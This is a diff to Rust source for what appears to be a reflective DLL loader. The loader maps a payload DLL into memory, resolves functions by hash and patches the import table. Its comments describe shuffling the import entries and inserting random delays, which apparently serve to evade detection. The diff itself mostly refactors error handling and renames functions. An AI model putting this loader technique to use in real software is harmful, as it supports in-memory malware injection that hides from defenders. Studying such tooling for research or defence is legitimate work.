@@ -53,36 +53,15 @@ fn panic(_info: &core::panic::PanicInfo) -> ! {
     loop {}
 }
 
-// TODO: add to blog references
-// https://research.ijcaonline.org/volume113/number8/pxc3901710.pdf
-
-// TODO: check if i8 types can be replaced with u8 types (especially in pointers)
-
-// TODO: replace plain returns with Result<T, E> and propagate errors until panic in the loader function
-
-// TODO: remove _fltused and _DllMainCRTStartup (and uncomment DllMain) if deemed unnecessary after testing
-
-#[export_name = "_fltused"]
-static _FLTUSED: i32 = 0;
-
 #[no_mangle]
-#[allow(non_snake_case)]
-pub unsafe extern "system" fn _DllMainCRTStartup(
-    _module: HMODULE,
-    _call_reason: u32,
-    _reserved: *mut c_void,
-) -> BOOL {
+#[allow(non_snake_case, clippy::missing_safety_doc)]
+pub unsafe extern "system" fn DllMain(_module: HMODULE, _reason: u32, _reserved: *mut u8) -> BOOL {
     1
 }
 
-//#[no_mangle]
-//#[allow(non_snake_case)]
-//pub unsafe extern "system" fn DllMain(_module: HMODULE, _reason: u32, _reserved: *mut u8) -> BOOL {
-//    1
-//}
-
 #[link_section = ".text"]
 #[no_mangle]
+#[allow(clippy::missing_safety_doc)]
 pub unsafe extern "system" fn loader(
     payload_dll: *mut c_void,
     function_hash: u32,
@@ -121,11 +100,8 @@ pub unsafe extern "system" fn loader(
         as *mut IMAGE_NT_HEADERS64;
     let module_img_size = (*module_nt_headers_ptr).OptionalHeader.SizeOfImage as usize;
     let preferred_base_ptr = (*module_nt_headers_ptr).OptionalHeader.ImageBase as *mut c_void;
-    let base_addr_ptr = allocate_rw_memory(preferred_base_ptr, module_img_size, &far_procs);
-
-    if base_addr_ptr.is_null() {
-        return;
-    }
+    let base_addr_ptr =
+        allocate_rw_memory(preferred_base_ptr, module_img_size, &far_procs).unwrap();
 
     copy_pe(base_addr_ptr, module_base_ptr, module_nt_headers_ptr);
 
@@ -331,7 +307,7 @@ unsafe fn allocate_rw_memory(
     preferred_base_ptr: *mut c_void,
     alloc_size: usize,
     far_procs: &FarProcs,
-) -> *mut c_void {
+) -> Option<*mut c_void> {
     let mut base_addr_ptr = (far_procs.VirtualAlloc)(
         preferred_base_ptr,
         alloc_size,
@@ -349,7 +325,11 @@ unsafe fn allocate_rw_memory(
         );
     }
 
-    base_addr_ptr
+    if base_addr_ptr.is_null() {
+        return None;
+    }
+
+    Some(base_addr_ptr)
 }
 
 #[link_section = ".text"]
@@ -438,7 +418,7 @@ unsafe fn patch_iat(
     base_addr_ptr: *mut c_void,
     mut import_descriptor_ptr: *mut IMAGE_IMPORT_DESCRIPTOR,
     far_procs: &FarProcs,
-) {
+) -> BOOL {
     /*
         1.) shuffle Import Directory Table entries (image import descriptors)
         2.) delay the relocation of each import a random duration
@@ -459,7 +439,10 @@ unsafe fn patch_iat(
     if import_count > 1 && SHUFFLE_IMPORTS {
         // Fisher-Yates shuffle
         for i in 0..import_count - 1 {
-            let rn = get_rn(far_procs).unwrap(); // TODO: replace with error propagation
+            let rn = match get_random(far_procs) {
+                Some(rn) => rn,
+                None => return 0,
+            };
 
             let gap = import_count - i;
             let j_u64 = i + (rn % gap);
@@ -473,17 +456,18 @@ unsafe fn patch_iat(
         let module_name_ptr = rva::<i8>(base_addr_ptr as _, (*import_descriptor_ptr).Name as usize);
 
         if module_name_ptr.is_null() {
-            return;
+            return 0;
         }
 
         let module_handle = (far_procs.LoadLibraryA)(module_name_ptr as _);
 
         if module_handle == 0 {
-            return;
+            return 0;
         }
 
         if DELAY_IMPORTS {
-            let rn = get_rn(far_procs).unwrap_or(0); // TODO: replace with error propagation
+            // skip delay if winapi call fails
+            let rn = get_random(far_procs).unwrap_or(0);
             let delay = rn % MAX_IMPORT_DELAY_MS;
             (far_procs.Sleep)(delay as _);
         }
@@ -517,7 +501,10 @@ unsafe fn patch_iat(
                 // mask out the high bits to get the ordinal value and patch the address of the function
                 let fn_ord_ptr = ((*original_thunk_ptr).u1.Ordinal & 0xFFFF) as *const u8;
                 (*thunk_ptr).u1.Function =
-                    (far_procs.GetProcAddress)(module_handle, fn_ord_ptr).unwrap() as _;
+                    match (far_procs.GetProcAddress)(module_handle, fn_ord_ptr) {
+                        Some(fn_addr) => fn_addr as usize as _,
+                        None => return 0,
+                    };
             } else {
                 // get the function name from the thunk and patch the address of the function
                 let thunk_data_ptr = (base_addr_ptr as usize
@@ -525,7 +512,10 @@ unsafe fn patch_iat(
                     as *mut IMAGE_IMPORT_BY_NAME;
                 let fn_name_ptr = (*thunk_data_ptr).Name.as_ptr();
                 (*thunk_ptr).u1.Function =
-                    (far_procs.GetProcAddress)(module_handle, fn_name_ptr).unwrap() as _;
+                    match (far_procs.GetProcAddress)(module_handle, fn_name_ptr) {
+                        Some(fn_addr) => fn_addr as usize as _,
+                        None => return 0,
+                    };
             }
 
             thunk_ptr = thunk_ptr.add(1);
@@ -535,6 +525,8 @@ unsafe fn patch_iat(
         import_descriptor_ptr =
             (import_descriptor_ptr as usize + size_of::<IMAGE_IMPORT_DESCRIPTOR>()) as _;
     }
+
+    1
 }
 
 #[link_section = ".text"]
@@ -609,7 +601,7 @@ unsafe fn finalize_relocations(
 }
 
 #[link_section = ".text"]
-unsafe fn get_rn(far_procs: &FarProcs) -> Option<u64> {
+unsafe fn get_random(far_procs: &FarProcs) -> Option<u64> {
     let mut buffer = [0u8; 8];
     let status = (far_procs.BCryptGenRandom)(
         BCRYPT_RNG_ALG_HANDLE,
